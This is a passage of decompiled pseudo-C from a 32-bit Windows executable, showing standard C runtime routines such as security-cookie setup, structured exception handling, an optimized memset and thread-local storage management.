    *(int32_t *)v1 = a1;
    int32_t result; // 0x4067b6
    return result;
}

// Address range: 0x4067cb - 0x40681a
int32_t function_4067cb(int32_t a1, int32_t a2) {
    int32_t lpSystemTimeAsFileTime = 0; // bp-16, 0x4067d1
    GetSystemTimeAsFileTime((struct _FILETIME *)&lpSystemTimeAsFileTime);
    int32_t v1 = GetCurrentThreadId() ^ lpSystemTimeAsFileTime ^ GetCurrentProcessId();
    int32_t v2 = v1; // bp-8, 0x4067fb
    int32_t lpPerformanceCount; // bp-24, 0x4067cb
    QueryPerformanceCounter((struct _LARGE_INTEGER *)&lpPerformanceCount);
    int32_t v3; // 0x4067cb
    return v3 ^ (int32_t)&v2 ^ v1 ^ lpPerformanceCount;
}

// Address range: 0x40681a - 0x406865
int32_t function_40681a(void) {
    int32_t v1 = g112; // 0x40681a
    if (v1 != -0x44bf19b2 == v1 >= 0x10000) {
        // 0x40685a
        g113 = v1 ^ -1;
        int32_t result; // 0x40681a
        return result;
    }
    // 0x406834
    int32_t v2; // 0x40681a
    int32_t v3; // 0x40681a
    int32_t v4 = function_4067cb(v2, v3); // 0x406834
    int32_t result2 = v4; // 0x40683d
    int32_t v5 = -0x44bf19b1; // 0x40683d
    if (v4 != -0x44bf19b2) {
        // 0x406846
        result2 = v4;
        v5 = v4;
        if (v4 < 0x10000) {
            int32_t v6 = 0x10000 * v4 | 0x47110000; // 0x40684f
            result2 = v6;
            v5 = v6 | v4;
        }
    }
    // 0x406854
    g112 = v5;
    // 0x40685a
    g113 = v5 ^ -1;
    return result2;
}

// Address range: 0x406865 - 0x40686b
int32_t function_406865(void) {
    // 0x406865
    return 0x4000;
}

// Address range: 0x40686b - 0x406877
void function_40686b(int32_t * ListHead) {
    // 0x40686b
    InitializeSListHead(ListHead);
}

// Address range: 0x406877 - 0x40687a
int32_t function_406877(void) {
    // 0x406877
    int32_t v1; // 0x406877
    return v1 & -256 | 1;
}

// Address range: 0x40687a - 0x4068a1
int32_t function_40687a(void) {
    // 0x40687a
    int32_t result; // 0x40687a
    if (result == 0) {
        // 0x406892
        return result;
    }
    // 0x406893
    function_4063c4(0, 0x10000);
    __asm_int3();
    return &g164;
}

// Address range: 0x4068a1 - 0x4068be
int32_t function_4068a1(void) {
    int32_t result = function_4053f0(); // 0x4068a1
    int32_t * v1 = (int32_t *)(result + 4); // 0x4068a6
    int32_t v2 = *v1; // 0x4068a6
    int32_t * v3 = (int32_t *)result; // 0x4068a9
    *v3 = *v3 | 4;
    *v1 = v2;
    *v3 = *v3 | 2;
    *v1 = v2;
    return result;
}

// Address range: 0x4068be - 0x4068ca
int32_t function_4068be(void) {
    // 0x4068be
    return g115 == 0;
}

// Address range: 0x4068ca - 0x4068d0
int32_t function_4068ca(void) {
    // 0x4068ca
    return &g256;
}

// Address range: 0x4068d0 - 0x4068d6
int32_t function_4068d0(void) {
    // 0x4068d0
    return &g255;
}

// Address range: 0x4068d6 - 0x406902
int32_t function_4068d6(void) {
    // 0x4068d6
    int32_t result; // 0x4068d6
    return result;
}

// Address range: 0x406902 - 0x40692e
int32_t function_406902(void) {
    // 0x406902
    int32_t result; // 0x406902
    return result;
}

// Address range: 0x40692e - 0x406951
int32_t function_40692e(char a1) {
    // 0x40692e
    int32_t result; // 0x40692e
    *(int32_t *)result = (int32_t)&g15;
    if ((a1 & 1) != 0) {
        // 0x406940
        function_405b5b(result);
    }
    // 0x40694a
    return result;
}

// Address range: 0x406951 - 0x406979
int32_t function_406951(int32_t ExceptionInfo) {
    // 0x406951
    SetUnhandledExceptionFilter(NULL);
    UnhandledExceptionFilter((struct _EXCEPTION_POINTERS *)ExceptionInfo);
    return TerminateProcess(GetCurrentProcess(), (int32_t)&g266);
}

// Address range: 0x406979 - 0x406a74
int32_t function_406979(int32_t a1) {
    bool v1 = IsProcessorFeaturePresent(23); // 0x406984
    int32_t v2; // 0x406979
    if (v1) {
        // 0x40698d
        __asm_int(41);
        v2 = 2;
    }
    // 0x406992
    int32_t v3; // bp-4, 0x406979
    int32_t v4 = &v3; // 0x40697a
    char v5 = llvm_ctpop_i8((char)v1); // 0x406989
    g172 = v1;
    g171 = v2;
    bool v6; // 0x406979
    bool v7; // 0x406979
    bool v8; // 0x406979
    bool v9; // 0x406979
    g175 = 0x4000 * (int32_t)v6 | 1024 * (int32_t)v7 | 512 * (int32_t)v8 | 256 * (int32_t)v9 | 128 * (int32_t)v1 | 64 * (int32_t)!v1 | 4 * (int32_t)((v5 & 1) == 0) | 2;
    g173 = v3;
    g174 = a1;
    int32_t v10; // 0x406979
    g176 = &v10;
    g170 = 0x10001;
    g167 = a1;
    g165 = -0x3ffffbf7;
    g166 = 1;
    g168 = 1;
    g169 = 2;
    *(int32_t *)(v4 - 8) = g112;
    *(int32_t *)(v4 - 4) = g113;
    return function_406951(0x41236c);
}

// Address range: 0x406a74 - 0x406aab
int32_t function_406a74(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    int32_t v1 = a1; // bp-12, 0x406a7f
    int32_t result; // 0x406a74
    int32_t v2 = result + 4; // 0x406a89
    *(int32_t *)result = (int32_t)&g12;
    *(int32_t *)v2 = 0;
    *(int32_t *)(result + 8) = 0;
    int32_t v3; // 0x406a74
    function_4070b7((int32_t)&v1, v2, v3, v1);
    return result;
}

// Address range: 0x406aab - 0x406ac6
int32_t function_406aab(int32_t a1) {
    // 0x406aab
    int32_t v1; // 0x406aab
    int32_t v2; // 0x406aab
    function_40630e(a1, v1, v2);
    int32_t result; // 0x406aab
    *(int32_t *)result = (int32_t)&g17;
    return result;
}

// Address range: 0x406ac6 - 0x406ae7
int32_t function_406ac6(int32_t a1) {
    // 0x406ac6
    int32_t v1; // 0x406ac6
    int32_t v2; // 0x406ac6
    int32_t result; // 0x406ac6
    function_406a74(a1, v1, result, v2);
    *(int32_t *)result = (int32_t)&g17;
    return result;
}

// Address range: 0x406ae7 - 0x406b02
int32_t function_406ae7(int32_t a1) {
    // 0x406ae7
    int32_t v1; // 0x406ae7
    int32_t v2; // 0x406ae7
    function_40630e(a1, v1, v2);
    int32_t result; // 0x406ae7
    *(int32_t *)result = (int32_t)&g16;
    return result;
}

// Address range: 0x406b02 - 0x406b82
int32_t function_406b02(char * a1) {
    // 0x406b02
    function_406ac6((int32_t)a1);
    int32_t v1; // bp-16, 0x406b02
    function_407139(&v1, &g80);
    __asm_int3();
    int32_t v2 = __readfsdword(0); // bp-56, 0x406b59
    __writefsdword(0, (int32_t)&v2);
    int32_t v3; // 0x406b02
    int32_t result = function_407470(v1, (int32_t)&g80, v3); // 0x406b6c
    __writefsdword(0, v2);
    return result;
}

// Address range: 0x406b82 - 0x406c5f
int32_t function_406b82(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6) {
    int32_t result; // 0x406b82
    if (a1 != 291) {
        int32_t v1 = __readfsdword(0); // bp-60, 0x406bec
        __writefsdword(0, (int32_t)&v1);
        function_407362();
        function_4065bf();
        __writefsdword(0, v1);
        result = 0;
    } else {
        // 0x406b92
        *(int32_t *)a2 = 0x406c31;
        result = 1;
    }
    // 0x406c5a
    return result;
}

// Address range: 0x406c5f - 0x406cd6
int32_t function_406c5f(int32_t a1, int32_t a2, int32_t a3, int32_t * a4, int32_t * a5) {
    int32_t * v1 = (int32_t *)(a1 + 12); // 0x406c6c
    int32_t v2 = *v1; // 0x406c6c
    int32_t v3 = *(int32_t *)(a1 + 16); // 0x406c71
    int32_t v4 = v2; // 0x406c79
    int32_t v5 = v2; // 0x406c79
    if (a2 < 0) {
      lab_0x406cb1:;
        uint32_t v6 = v5;
        uint32_t v7 = v4 + 1; // 0x406cb4
        *a4 = v7;
        *a5 = v6;
        if (!((v7 > v6 | v6 > *v1))) {
            // 0x406cc5
            return 20 * v7 + v3;
        }
        // 0x406cd1
        function_40a896();
        // UNREACHABLE
    }
    int32_t v8 = v2; // 0x406c81
    int32_t v9 = 20 * v2 + 8 + v3; // 0x406c81
    int32_t v10 = v2; // 0x406c81
    int32_t v11 = v2; // 0x406c81
    int32_t v12 = a2; // 0x406c81
    int32_t v13; // 0x406c5f
    int32_t v14; // 0x406c5f
    int32_t v15; // 0x406c5f
    int32_t v16; // 0x406c5f
    while (true) {
      lab_0x406c83:
        // 0x406c83
        v13 = v10;
        if (v13 == -1) {
            // break -> 0x406cd1
            break;
        }
        // 0x406c88
        v15 = v12;
        v14 = v11;
        int32_t v17 = v9;
        v16 = v8;
        v9 = v17 - 20;
        v10 = v13 - 1;
        if (*(int32_t *)(v17 - 24) < a3) {
            // 0x406c97
            if (*(int32_t *)v9 < a3) {
                goto lab_0x406ca1;
            } else {
                goto lab_0x406ca6;
            }
        } else {
            goto lab_0x406ca1;
        }
    }
    // 0x406cd1
    function_40a896();
    // UNREACHABLE
  lab_0x406ca1:
    // 0x406ca1
    v8 = v16;
    int32_t v18 = v14; // 0x406ca4
    int32_t v19 = v15; // 0x406ca4
    if (v13 != 0) {
        goto lab_0x406cad;
    } else {
        goto lab_0x406ca6;
    }
  lab_0x406ca6:
    // 0x406ca6
    v8 = v10;
    v18 = v16;
    v19 = v15 - 1;
    goto lab_0x406cad;
  lab_0x406cad:
    // 0x406cad
    v12 = v19;
    v11 = v18;
    v4 = v10;
    v5 = v11;
    if (v12 < 0) {
        goto lab_0x406cb1;
    }
    goto lab_0x406c83;
}

// Address range: 0x406cd7 - 0x406d02
int32_t function_406cd7(int32_t result, int32_t a2) {
    // 0x406cd7
    __writefsdword(0, *(int32_t *)__readfsdword(0));
    return result;
}

// Address range: 0x406d02 - 0x406d09
int32_t function_406d02(int32_t a1) {
    // 0x406d02
    int32_t result; // 0x406d02
    return result;
}

// Address range: 0x406d09 - 0x406d5e
int32_t function_406d09(int32_t TargetFrame, int32_t ExceptionRecord) {
    int32_t v1 = __readfsdword(0); // 0x406d11
    RtlUnwind((int32_t *)TargetFrame, &g1, (struct _EXCEPTION_RECORD *)ExceptionRecord, NULL);
    int32_t * v2 = (int32_t *)(ExceptionRecord + 4); // 0x406d36
    int32_t result = *v2 & -3; // 0x406d39
    *v2 = result;
    *(int32_t *)v1 = __readfsdword(0);
    __writefsdword(0, v1);
    return result;
}

// Address range: 0x406d5e - 0x406d8f
int32_t function_406d5e(int32_t a1, int32_t a2, int32_t a3) {
    // 0x406d5e
    function_4065ae();
    int32_t v1 = *(int32_t *)(a2 + 12); // 0x406d76
    int32_t v2 = *(int32_t *)(a2 + 16); // 0x406d7e
    return function_407fb2(a1, v2, a3, 0, v1, *(int32_t *)(a2 + 20), a2, 0);
}

// Address range: 0x406d8f - 0x406db3
int32_t function_406d8f(int32_t result, int32_t a2) {
    // 0x406d8f
    *(int32_t *)result = a2;
    *(int32_t *)(result + 4) = *(int32_t *)(function_407362() + 36);
    *(int32_t *)(function_407362() + 36) = result;
    return result;
}

// Address range: 0x406db3 - 0x406df7
int32_t function_406db3(int32_t a1) {
    int32_t v1 = *(int32_t *)(function_407362() + 36); // 0x406dbc
    int32_t result = function_407362(); // 0x406dbf
    if (v1 == a1) {
        // 0x406dcc
        *(int32_t *)(result + 36) = *(int32_t *)(a1 + 4);
        return result;
    }
    int32_t * v2 = (int32_t *)(*(int32_t *)(result + 36) + 4);
    int32_t v3 = *v2; // 0x406de3
    while (v3 != 0) {
        // 0x406de9
        if (v3 == a1) {
            int32_t result2 = *(int32_t *)(a1 + 4); // 0x406deb
            *v2 = result2;
            return result2;
        }
        v2 = (int32_t *)(v3 + 4);
        v3 = *v2;
    }
    // 0x406df2
    function_40a896();
    // UNREACHABLE
}

// Address range: 0x406df8 - 0x406e8f
int32_t function_406df8(int32_t a1, int32_t a2, int32_t a3) {
    // 0x406df8
    function_4065ae();
    if ((*(int32_t *)(a1 + 4) & 102) != 0) {
        // 0x406e17
        *(int32_t *)(a2 + 36) = 1;
        return function_406e92((int32_t)&g266);
    }
    int32_t v1 = *(int32_t *)(a2 + 24); // 0x406e2d
    int32_t v2 = v1; // bp-20, 0x406e2d
    int32_t v3 = *(int32_t *)(a2 + 12); // 0x406e39
    int32_t v4 = *(int32_t *)(a2 + 16); // 0x406e44
    function_407fb2(a1, v4, a3, 0, v3, *(int32_t *)(a2 + 20), v1, 1);
    int32_t v5; // bp-12, 0x406df8
    int32_t * v6 = &v5; // 0x406e59
    if (*(int32_t *)(a2 + 36) == 0) {
        // 0x406e5b
        v2 = a2;
        function_406d09(a2, a1);
        v6 = &v2;
    }
    int32_t v7 = (int32_t)v6;
    *(int32_t *)(v7 - 4) = 0;
    *(int32_t *)(v7 - 8) = 0;
    *(int32_t *)(v7 - 12) = 0;
    *(int32_t *)(v7 - 16) = 0;
    *(int32_t *)(v7 - 20) = 0;
    int32_t result; // bp-8, 0x406df8
    *(int32_t *)(v7 - 24) = (int32_t)&result;
    *(int32_t *)(v7 - 28) = 291;
    function_406b82((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
    return result;
}

// Address range: 0x406e8f - 0x406e92
int32_t function_406e8f(void) {
    // 0x406e8f
    return 1;
}

// Address range: 0x406e92 - 0x406e97
int32_t function_406e92(int32_t a1) {
    // 0x406e92
    int32_t result; // 0x406e92
    return result;
}

// Address range: 0x406e97 - 0x406ecd
int32_t function_406e97(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    // 0x406e97
    int32_t v1; // 0x406e97
    return function_407fb2(a1, a2, a3, a4, v1, 0, 0, 0);
}

// Address range: 0x406ecd - 0x406ef6
int32_t function_406ecd(void) {
    // 0x406ecd
    function_4084cb();
    function_408470();
    int32_t v1 = function_40819a(); // 0x406ed7
    if ((char)v1 == 0) {
        // 0x406ee0
        return v1 & -256;
    }
    int32_t v2 = function_407402(); // 0x406ee3
    if ((char)v2 != 0) {
        // 0x406ef3
        return v2 & -256 | 1;
    }
    // 0x406ee0
    return function_4081d6() & -256;
}

// Address range: 0x406ef6 - 0x406f15
int32_t function_406ef6(int32_t a1) {
    // 0x406ef6
    int32_t v1; // 0x406ef6
    if ((char)a1 == 0) {
        // 0x406eff
        int32_t v2; // 0x406ef6
        function_407446(v2);
        function_4081d6();
        v1 = function_408499(0);
    }
    // 0x406f11
    return v1 & -256 | 1;
}

// Address range: 0x406f20 - 0x406f52
int32_t function_406f20(int32_t a1, int32_t a2) {
    // 0x406f20
    if (*(int32_t *)a1 != -2) {
        // 0x406f32
        function_4065ae();
    }
    // 0x406f3f
    return function_4065ae();
}

// Address range: 0x406f60 - 0x4070b7
int32_t function_406f60(int32_t a1, int32_t a2, int32_t a3) {
    int32_t v1 = a2 + 16; // 0x406f73
    int32_t v2 = g112 ^ *(int32_t *)(a2 + 8); // 0x406f76
    int32_t v3 = v2; // bp-52, 0x406f7d
    function_406f20(v2, v1);
    function_40813d(a3);
    int32_t * v4 = (int32_t *)(a2 + 12); // 0x406f9e
    int32_t v5 = *v4; // 0x406f9e
    int32_t v6; // 0x406f60
    int32_t v7; // 0x406f60
    int32_t result; // 0x406f60
    int32_t v8; // 0x406fc9
    int32_t v9; // 0x406f9b
    if ((*(char *)(a1 + 4) & 102) != 0) {
        // 0x407006
        if (v5 == -2) {
            // 0x407029
            return 1;
        }
        // 0x40700b
        v3 = v1;
        function_408630(v1, &g112);
        result = 1;
        v7 = &v3;
    } else {
        // 0x406fa7
        int32_t v10; // bp-44, 0x406f60
        v9 = &v10;
        int32_t v11 = a1; // bp-32, 0x406fa7
        *(int32_t *)(a2 - 4) = (int32_t)&v11;
        if (v5 == -2) {
            // 0x407029
            return 1;
        }
        v6 = v5;
        int32_t v12 = 4 * (v6 + 4 + 2 * v6) + v2; // 0x406fc9
        v8 = *(int32_t *)v12;
        char v13 = 0; // 0x406fd7
        int32_t v14; // 0x406fdb
        if (*(int32_t *)(v12 + 4) != 0) {
            // 0x406fd9
            v14 = function_4085e0(v12);
            result = 0;
            v7 = v9;
            if (v14 < 0) {
                goto lab_0x40701d;
            }
            // 0x406fe9
            v13 = 1;
            if (v14 != 0) {
                // 0x407033
                if (*(int32_t *)a1 != -0x1f928c9d) {
                    goto lab_0x407076;
                } else {
                    // 0x407047
                    if (function_4111f0(&g30) == 0) {
                        goto lab_0x407076;
                    } else {
                        // 0x407058
                        v3 = a1;
                        function_4065bf();
                        function_4087ab();
                        goto lab_0x407076;
                    }
                }
            }
        }
        char v15 = v13;
        while (v8 != -2) {
            // 0x406fc0
            v6 = v8;
            v12 = 4 * (v6 + 4 + 2 * v6) + v2;
            v8 = *(int32_t *)v12;
            v13 = v15;
            if (*(int32_t *)(v12 + 4) != 0) {
                // 0x406fd9
                v14 = function_4085e0(v12);
                result = 0;
                v7 = v9;
                if (v14 < 0) {
                    goto lab_0x40701d;
                }
                // 0x406fe9
                v13 = 1;
                if (v14 != 0) {
                    // 0x407033
                    if (*(int32_t *)a1 != -0x1f928c9d) {
                        goto lab_0x407076;
                    } else {
                        // 0x407047
                        if (function_4111f0(&g30) == 0) {
                            goto lab_0x407076;
                        } else {
                            // 0x407058
                            v3 = a1;
                            function_4065bf();
                            function_4087ab();
                            goto lab_0x407076;
                        }
                    }
                }
            }
            // 0x406ff0
            v15 = v13;
        }
        // 0x406ff7
        result = 1;
        v7 = v9;
        if (v15 == 0) {
            // 0x407029
            return 1;
        }
    }
  lab_0x40701d:
    // 0x40701d
    *(int32_t *)(v7 - 4) = v1;
    *(int32_t *)(v7 - 8) = v2;
    function_406f20((int32_t)&g266, (int32_t)&g266);
    // 0x407029
    return result;
  lab_0x407076:
    // 0x407076
    function_408614();
    int32_t v16 = v9; // 0x407086
    if (*v4 == v6) {
        goto lab_0x40709a;
    } else {
        // 0x407088
        v3 = v1;
        function_408630(v1, &g112);
        v16 = &v3;
        goto lab_0x40709a;
    }
  lab_0x40709a:
    // 0x40709a
    *(int32_t *)(v16 - 4) = v1;
    *(int32_t *)(v16 - 8) = v2;
    *v4 = v8;
    function_406f20((int32_t)&g266, (int32_t)&g266);
    function_4085f8();
    return __asm_int3();
}

// Address range: 0x4070b7 - 0x40711a
int32_t function_4070b7(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    int32_t * v1 = (int32_t *)a1;
    int32_t v2 = *v1;
    int32_t result = v2; // 0x4070c2
    if (*(char *)(a1 + 4) != 0) {
        // 0x4070c4
        result = 0;
        if (v2 != 0) {
            int32_t v3 = v2;
            int32_t v4 = v3 + 1; // 0x4070d2
            while (*(char *)v3 != 0) {
                // 0x4070cd
                v3 = v4;
                v4 = v3 + 1;
            }
            int32_t v5 = function_4096d3(); // 0x4070dc
            if (v5 != 0) {
                // 0x4070e8
                function_40a931(v5, 1 - v2 + v3, *v1);
                *(int32_t *)a2 = v5;
                *(char *)(a2 + 4) = 1;
            }
            // 0x407117
            return function_40a891();
        }
    }
    // 0x40710c
    *(int32_t *)a2 = result;
    *(char *)(a2 + 4) = 0;
    // 0x407117
    return result;
}

// Address range: 0x40711a - 0x407139
int32_t function_40711a(int32_t a1) {
    char * v1 = (char *)(a1 + 4); // 0x407121
    int32_t result; // 0x40711a
    if (*v1 != 0) {
        // 0x407127
        result = function_40a891();
    }
    // 0x40712f
    *(int32_t *)a1 = 0;
    *v1 = 0;
    return result;
}

// Address range: 0x407139 - 0x4071a8
int32_t function_407139(int32_t * dwExceptionCode, int32_t * a2) {
    int32_t v1 = (int32_t)a2;
    int32_t v2 = 8; // bp-52, 0x407145
    int32_t v3; // bp-48, 0x407139
    int32_t v4 = &v3; // 0x407147
    int32_t v5; // bp-36, 0x407139
    __asm_rep_movsd_memcpy((char *)&v5, (char *)&g22, 8);
    int32_t v6 = v4; // 0x407157
    int32_t dwExceptionFlags = v1; // 0x407157
    if (a2 != NULL) {
        // 0x407159
        v6 = v4;
        dwExceptionFlags = v1;
        if ((*(char *)a2 & 16) != 0) {
            int32_t v7 = *dwExceptionCode - 4; // 0x407160
            v2 = v7;
            function_4065bf();
            v6 = &v2;
            dwExceptionFlags = *(int32_t *)(*(int32_t *)v7 + 24);
        }
    }
    // 0x407176
    int32_t v8; // bp-16, 0x407139
    if (dwExceptionFlags != 0) {
        // 0x407180
        if ((*(char *)dwExceptionFlags & 8) != 0) {
            // 0x407185
            v8 = 0x1994000;
        }
    }
    // 0x40718c
    *(int32_t *)(v6 - 4) = (int32_t)&v8;
    *(int32_t *)(v6 - 16) = v5;
    RaiseException((int32_t)dwExceptionCode, dwExceptionFlags, (int32_t)&g266, &g266);
    return &g266;
}

// Address range: 0x4071b0 - 0x40730a
int32_t function_4071b0(int32_t * a1, int32_t a2, int32_t a3) {
    int32_t result = (int32_t)a1;
    if (a3 == 0) {
        // 0x407303
        return result;
    }
    int32_t v1 = 0x1010101 * (a2 & 255); // 0x4071c7
    int32_t v2 = a3; // 0x4071d0
    int32_t v3 = result; // 0x4071d0
    int32_t v4; // 0x4071b0
    int32_t v5; // 0x4071b0
    int32_t v6; // 0x4071b0
    int32_t v7; // 0x4071b0
    int128_t v8; // 0x4071b0
    if (a3 < 33) {
        goto lab_0x4072b5;
    } else {
        // 0x4071d6
        v4 = a3;
        v6 = result;
        if (a3 < 128) {
            goto lab_0x40726d;
        } else {
            // 0x4071e2
            if ((g163 & 2) != 0) {
                // 0x4071ec
                __asm_rep_stosb_memset((char *)a1, (char)v1, a3);
                return result;
            }
            // 0x4071f5
            v2 = a3;
            v3 = result;
            if ((g114 & 2) == 0) {
                goto lab_0x4072b5;
            } else {
                int128_t v9 = __asm_pshufd(__asm_movd(v1), 0); // 0x407207
                __asm_movups(*(int128_t *)a1, v9);
                int32_t v10 = result + 16 & -16; // 0x407214
                int32_t v11 = result + a3 - v10; // 0x407217
                v4 = v11;
                v6 = v10;
                if (v11 < 129) {
                    goto lab_0x40726d;
                } else {
                    __asm_movdqa(*(int128_t *)v10, v9);
                    __asm_movdqa(*(int128_t *)(v10 + 16), v9);
                    __asm_movdqa(*(int128_t *)(v10 + 32), v9);
                    __asm_movdqa(*(int128_t *)(v10 + 48), v9);
                    __asm_movdqa(*(int128_t *)(v10 + 64), v9);
                    __asm_movdqa(*(int128_t *)(v10 + 80), v9);
                    __asm_movdqa(*(int128_t *)(v10 + 96), v9);
                    __asm_movdqa(*(int128_t *)(v10 + 112), v9);
                    int32_t v12 = v10 + 128; // 0x407257
                    int32_t v13 = v11 - 128; // 0x40725d
                    int32_t v14 = v13; // 0x407269
                    int32_t v15 = v12; // 0x407269
                    v8 = v9;
                    v5 = v13;
                    v7 = v12;
                    while (v13 >= 256) {
                        // 0x407230
                        __asm_movdqa(*(int128_t *)v15, v9);
                        __asm_movdqa(*(int128_t *)(v15 + 16), v9);
                        __asm_movdqa(*(int128_t *)(v15 + 32), v9);
                        __asm_movdqa(*(int128_t *)(v15 + 48), v9);
                        __asm_movdqa(*(int128_t *)(v15 + 64), v9);
                        __asm_movdqa(*(int128_t *)(v15 + 80), v9);
                        __asm_movdqa(*(int128_t *)(v15 + 96), v9);
                        __asm_movdqa(*(int128_t *)(v15 + 112), v9);
                        v12 = v15 + 128;
                        v13 = v14 - 128;
                        v14 = v13;
                        v15 = v12;
                        v8 = v9;
                        v5 = v13;
                        v7 = v12;
                    }
                    goto lab_0x407280;
                }
            }
        }
    }
  lab_0x4072b5:;
    int32_t v16 = v2; // 0x4072bb
    int32_t v17 = v3; // 0x4072bb
    if ((v2 & 3) != 0) {
        int32_t v18 = v2; // 0x4072c0
        int32_t v19 = v3; // 0x4072bf
        *(char *)v19 = (char)v1;
        v19++;
        v18--;
        v16 = v18;
        v17 = v19;
        while ((v18 & 3) != 0) {
            // 0x4072bd
            *(char *)v19 = (char)v1;
            v19++;
            v18--;
            v16 = v18;
            v17 = v19;
        }
    }
    int32_t v20 = v16; // 0x4072d1
    int32_t v21 = v17; // 0x4072d1
    if ((v16 & 4) != 0) {
        // 0x4072d3
        *(int32_t *)v17 = v1;
        v20 = v16 - 4;
        v21 = v17 + 4;
    }
    // 0x4072db
    if (v20 < 8) {
        // 0x407303
        return result;
    }
    int32_t v22 = v21; // 0x4072e1
    *(int32_t *)v22 = v1;
    *(int32_t *)(v22 + 4) = v1;
    int32_t v23 = v20 - 8; // 0x4072f8
    int32_t v24 = v23; // 0x407301
    v22 += 8;
    while (v23 >= 8) {
        // 0x4072f0
        *(int32_t *)v22 = v1;
        *(int32_t *)(v22 + 4) = v1;
        v23 = v24 - 8;
        v24 = v23;
        v22 += 8;
    }
    // 0x407303
    return result;
  lab_0x40726d:
    // 0x40726d
    v2 = v4;
    v3 = v6;
    if ((g114 & 2) == 0) {
        goto lab_0x4072b5;
    } else {
        // 0x407277
        v8 = __asm_pshufd(__asm_movd(v1), 0);
        v5 = v4;
        v7 = v6;
        goto lab_0x407280;
    }
  lab_0x407280:;
    int32_t v25 = v5; // 0x407283
    int32_t v26 = v7; // 0x407283
    if (v5 >= 32) {
        __asm_movdqu(*(int128_t *)v7, v8);
        __asm_movdqu(*(int128_t *)(v7 + 16), v8);
        int32_t v27 = v7 + 32; // 0x40728e
        int32_t v28 = v5 - 32; // 0x407291
        int32_t v29 = v28; // 0x407297
        int32_t v30 = v27; // 0x407297
        while (v28 >= 32) {
            // 0x407285
            __asm_movdqu(*(int128_t *)v30, v8);
            __asm_movdqu(*(int128_t *)(v30 + 16), v8);
            v27 = v30 + 32;
            v28 = v29 - 32;
            v29 = v28;
            v30 = v27;
        }
        // 0x407299
        v25 = v28;
        v26 = v27;
        if ((v28 & 31) == 0) {
            // 0x407303
            return result;
        }
    }
    int32_t v31 = v25 - 32 + v26; // 0x4072a1
    __asm_movdqu(*(int128_t *)v31, v8);
    __asm_movdqu(*(int128_t *)(v31 + 16), v8);
    return result;
}

// Address range: 0x40730a - 0x407346
int32_t function_40730a(int32_t a1, int32_t a2, int32_t a3) {
    if (a1 == a2) {
        // 0x407317
        return 0;
    }
    int32_t v1 = a1 + 5; // 0x40731e
    int32_t v2 = a2 + 5; // 0x40731e
    unsigned char v3 = *(char *)v1; // 0x407321
    unsigned char v4 = *(char *)v2; // 0x407323
    bool v5; // 0x40730a
    while (v3 == v4) {
        if (v3 == 0) {
            // 0x407317
            return 0;
        }
        unsigned char v6 = *(char *)(v1 + 1); // 0x40732b
        unsigned char v7 = *(char *)(v2 + 1); // 0x40732e
        if (v6 != v7) {
            // 0x40733f
            v5 = v6 < v7;
            return v5 ? -1 : 1;
        }
        // 0x407333
        v1 += 2;
        v2 += 2;
        if (v6 == 0) {
            // 0x407317
            return 0;
        }
        v3 = *(char *)v1;
        v4 = *(char *)v2;
    }
    // 0x40733f
    v5 = v3 < v4;
  lab_0x40733f_2:
    // 0x40733f
    return v5 ? -1 : 1;
}

// Address range: 0x407346 - 0x407362
int32_t function_407346(int32_t a1) {
    int32_t result = a1; // 0x40734e
    if (a1 != 0 && a1 != (int32_t)&g177) {
        // 0x407357
        result = function_40a891();
    }
    // 0x40735e
    return result;
}

// Address range: 0x407362 - 0x407370
int32_t function_407362(void) {
    int32_t result = function_407370(); // 0x407362
    if (result != 0) {
        // 0x40736f
        return result;
    }
    function_40a98b();
    // UNREACHABLE
}

// Address range: 0x407370 - 0x407402
int32_t function_407370(void) {
    // 0x407370
    if (g116 == -1) {
        // 0x407379
        return 0;
    }
    int32_t errorCode = GetLastError(); // 0x40737e
    int32_t result = function_4083b0((int32_t)g116); // 0x40738c
    if (result == -1) {
        // 0x4073f6
        SetLastError(0x1000000 * errorCode / 0x1000000);
        return 0;
    }
    // 0x407399
    if (result != 0) {
        // 0x4073f6
        SetLastError(0x1000000 * errorCode / 0x1000000);
        return result;
    }
    int32_t v1 = function_4083eb((int32_t)g116, -1); // 0x4073a5
    if (v1 == 0) {
        // 0x4073f6
        SetLastError(0x1000000 * errorCode / 0x1000000);
        return 0;
    }
    int32_t v2 = function_4083eb((int32_t)g116, 0x1000000 * v1 / 0x1000000); // 0x4073cd
    int32_t result2 = v1; // 0x4073d6
    if (v2 == 0) {
        // 0x4073d8
        function_4083eb((int32_t)g116, 0);
        result2 = 0;
    }
    // 0x4073ee
    function_40a891();
    // 0x4073f6
    SetLastError(0x1000000 * errorCode / 0x1000000);
    return result2;
}

// Address range: 0x407402 - 0x407446
int32_t function_407402(void) {
    int32_t v1 = function_40833a(0x407346); // 0x407407
    g116 = v1;
    if (v1 == -1) {
        // 0x407440
        return -256;
    }
    int32_t v2 = function_4083eb(v1, (int32_t)&g177); // 0x40741d
    if (v2 != 0) {
        // 0x407443
        return v2 & -256 | 1;
    }
    int32_t result = -256; // 0x407430
    if (g116 != -1) {
        int32_t v3 = function_408375((int32_t)g116); // 0x407433
        g116 = -1;
        result = v3 & -256;
    }
    // 0x407440
    return result;
}

// Address range: 0x407446 - 0x407461
int32_t function_407446(int32_t a1) {
    int32_t result = -255; // 0x40744e
    if (g116 != -1) {
        int32_t v1 = function_408375((int32_t)g116); // 0x407451
        g116 = -1;
        result = v1 & -256 | 1;
    }
    // 0x40745e
    return result;
}

// Address range: 0x407470 - 0x4074bc
int32_t function_407470(int32_t a1, int32_t a2, int32_t a3) {
    // 0x407470
    int32_t v1; // bp-4, 0x407470
    function_408760(a3, &v1);
    int32_t v2 = *(int32_t *)(a3 + 16); // 0x40749c
    return function_408760(v2 != 256 ? v2 : 2, (int32_t *)a3);
}

// Address range: 0x4074bc - 0x4074d7
int32_t function_4074bc(int32_t a1) {
    // 0x4074bc
    int32_t v1; // 0x4074bc
    int32_t v2; // 0x4074bc
    function_40630e(a1, v1, v2);
    int32_t result; // 0x4074bc
    *(int32_t *)result = (int32_t)&g23;
    return result;
}

// Address range: 0x4074d7 - 0x4074ef
int32_t function_4074d7(void) {
    // 0x4074d7
    int32_t result; // 0x4074d7
    *(int32_t *)(result + 8) = 0;
    *(int32_t *)(result + 4) = (int32_t)"bad exception";
